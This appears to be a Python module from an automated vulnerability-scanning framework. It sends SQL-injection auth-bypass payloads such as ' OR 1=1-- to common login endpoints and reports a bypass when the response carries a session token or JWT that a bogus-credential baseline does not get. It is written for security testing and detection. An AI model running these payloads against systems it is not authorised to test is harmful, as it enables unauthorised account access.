"""Login SQL-injection / auth-bypass probe (vuln phase, non-destructive).

Many auth bypasses live in the login handler, not a query string — and modern
apps take a JSON body and return a JWT, not a redirect+cookie. This probe sends
a benign SQLi payload (`' OR 1=1--`) to common login endpoints (JSON and
form-encoded) and confirms a bypass ONLY when:

  * a bogus-credential baseline does NOT yield a token (so the endpoint isn't
    just handing tokens to everyone), AND
  * the SQLi payload yields a 200 carrying a session token / JWT.

Detection only — the recovered session is never used. Runs in the vuln phase so
it fires without --go (unlike the exploit-phase auth_bypass worker, which needs
a triggering finding).
"""

from __future__ import annotations

import json
import logging
import re
import urllib.parse
from typing import List, Optional
from urllib.parse import urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.login_sqli")

TECHNIQUE = "login_sqli"

# Root-relative login endpoints, REST and classic.
_LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/login",
    "/login", "/auth/login", "/user/login", "/account/login", "/signin",
]

# Benign auth-bypass payloads placed in the identity field.
_SQLI_PAYLOADS = ["' OR 1=1--", "' OR '1'='1", "admin' OR '1'='1'--", "' OR 1=1#"]

# A JWT (header.payload.signature) or a JSON token field signals a live session.
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
_TOKEN_KEYS = re.compile(r'"(token|authentication|access_token|auth_token|jwt)"', re.I)


def _origin(url: str) -> str:
    p = urlsplit(url)
    return f"{p.scheme}://{p.netloc}" if p.netloc else url.rstrip("/")


async def _post_login(url: str, ident: str, password: str, *, as_json: bool,
                      timeout: float) -> Optional[HttpResp]:
    fields = {"email": ident, "username": ident, "user": ident,
              "password": password, "pass": password, "pwd": password}
    if as_json:
        body = json.dumps({"email": ident, "username": ident,
                           "password": password}).encode()
        ct = "application/json"
    else:
        body = urllib.parse.urlencode(fields).encode()
        ct = "application/x-www-form-urlencoded"
    return await fetch("POST", url, headers={"Content-Type": ct}, body=body,
                       timeout=timeout, follow_redirects=False)


def _has_token(resp: Optional[HttpResp]) -> bool:
    if not resp or resp.status != 200 or not resp.body:
        return False
    return bool(_JWT_RE.search(resp.body) or _TOKEN_KEYS.search(resp.body))


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    origin = _origin(url)
    timeout = min(agent.timeout_s, 8.0)
    findings: list[dict] = []

    for path in _LOGIN_PATHS:
        login_url = origin + path
        for as_json in (True, False):
            # Baseline: a wrong credential must NOT return a token, else the
            # endpoint hands tokens to anyone and a token is no SQLi signal.
            baseline = await _post_login(
                login_url, "no_such_user_8f31@example.com", "wrongpass_8f31",
                as_json=as_json, timeout=timeout)
            if baseline is None or baseline.status >= 500:
                continue
            if _has_token(baseline):
                continue
            for payload in _SQLI_PAYLOADS:
                resp = await _post_login(login_url, payload, "x",
                                         as_json=as_json, timeout=timeout)
                if _has_token(resp):
                    findings.append({
                        "type": "auth_bypass_confirmed",
                        "vuln_type": "auth_bypass:sqli_login",
                        "title": f"SQL-injection auth bypass at {path}",
                        "severity": "critical",
                        "url": login_url,
                        "parameter": "email" if as_json else "username",
                        "payload": payload,
                        "cwe": "CWE-89",
                        "confidence": 0.92,
                        "foothold": True,
                        "evidence": (
                            f"{'JSON' if as_json else 'form'} login with "
                            f"{payload!r} returned a 200 carrying a session "
                            "token while a bogus credential did not"
                        ),
                        "poc_request": (
                            f"POST {login_url} "
                            f"({'json' if as_json else 'form'}) email={payload}"
                        ),
                    })
                    return findings  # one confirmed bypass is enough
    return findings


register_worker("vuln", TECHNIQUE, run)
